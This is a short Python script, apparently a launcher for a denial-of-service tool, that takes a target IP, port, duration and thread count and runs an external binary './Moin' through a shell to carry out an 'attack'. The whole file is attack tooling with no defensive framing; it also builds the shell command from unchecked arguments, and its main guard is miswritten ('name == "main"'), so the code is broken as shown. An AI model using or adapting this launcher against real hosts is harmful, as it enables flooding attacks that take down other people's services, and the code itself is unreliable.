import os
import sys
import time
import subprocess

def run_attack(ip, port, duration, threads=1450):
    command = f"./Moin {ip} {port} {duration} {threads}"
    print(f"Running: {command}")
    process = subprocess.Popen(command, shell=True)
    try:
        time.sleep(int(duration))
    finally:
        process.terminate()
        print("Attack finished.")

if name == "main":
    if len(sys.argv) < 4:
        print("Usage: runner.py <ip> <port> <duration> [threads]")
        sys.exit(1)

    ip = sys.argv[1]
    port = sys.argv[2]
    duration = sys.argv[3]
    threads = sys.argv[4] if len(sys.argv) >= 5 else 1450  # Default threads

    run_attack(ip, port, duration, threads)